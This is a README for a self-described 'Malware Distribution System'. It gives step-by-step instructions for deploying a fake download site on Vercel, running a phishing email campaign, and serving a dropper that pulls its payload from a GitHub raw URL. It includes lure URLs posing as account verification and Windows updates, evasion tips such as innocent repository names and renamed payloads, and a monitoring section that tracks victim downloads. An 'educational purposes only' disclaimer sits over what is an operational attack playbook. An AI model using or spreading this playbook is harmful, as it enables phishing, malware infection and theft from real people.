# Malware Distribution System

⚠️ **WARNING: This is for educational purposes only!**

## 🚀 Quick Deployment to Vercel

### Step 1: Create GitHub Repository

1. Go to [GitHub](https://github.com) and create a new repository
2. Name it something like `techcorp-portal` or `business-solutions`
3. Make it **PRIVATE** (important for security)
4. Initialize with README

### Step 2: Upload Files

Upload these files to your GitHub repository:
- `api/index.py` - Main server code
- `vercel.json` - Vercel configuration
- `requirements.txt` - Python dependencies
- `app.py` - Malware payload (rename to something innocent)

### Step 3: Deploy to Vercel

1. Go to [Vercel](https://vercel.com)
2. Sign up/Login with GitHub
3. Click "New Project"
4. Import your GitHub repository
5. Deploy (no configuration needed)

### Step 4: Get Your URL

After deployment, you'll get a URL like:
`https://your-project-name.vercel.app`

## 📧 Email Campaign Setup

### Update Campaign Script

1. Edit `vercel_campaign.py`
2. Replace `YOUR_VERCEL_URL` with your actual Vercel URL
3. Run the campaign

### Example URLs After Deployment:

- `https://techcorp-portal.vercel.app/download/project-document-2024`
- `https://business-solutions.vercel.app/verify/account-verification`
- `https://security-updates.vercel.app/update/KB5001234`

## 🎯 How It Works

1. **Email Sent** - Victim receives phishing email
2. **Link Clicked** - Victim clicks malicious link
3. **Page Loaded** - Legitimate-looking download page appears
4. **File Downloaded** - Victim downloads "malware.exe"
5. **Malware Executed** - File executes and downloads real malware from GitHub

## 🔧 Customization

### Change Repository Name
Edit `api/index.py` line with `raw.githubusercontent.com/USERNAME/REPO/main/app.py`

### Add More Templates
Edit the HTML templates in `api/index.py`

### Modify Malware Payload
Edit the `MALWARE_PAYLOAD` variable in `api/index.py`

## 📊 Monitoring

- Check Vercel dashboard for traffic
- Monitor GitHub repository for malware downloads
- Use campaign logs to track email success rates

## ⚠️ Security Notes

- Keep GitHub repository PRIVATE
- Use innocent repository names
- Don't use obvious malware-related names
- Consider using multiple repositories for different campaigns

## 🚨 Legal Disclaimer

This software is for educational and research purposes only. The authors are not responsible for any misuse of this software. Users must comply with all applicable laws and regulations.
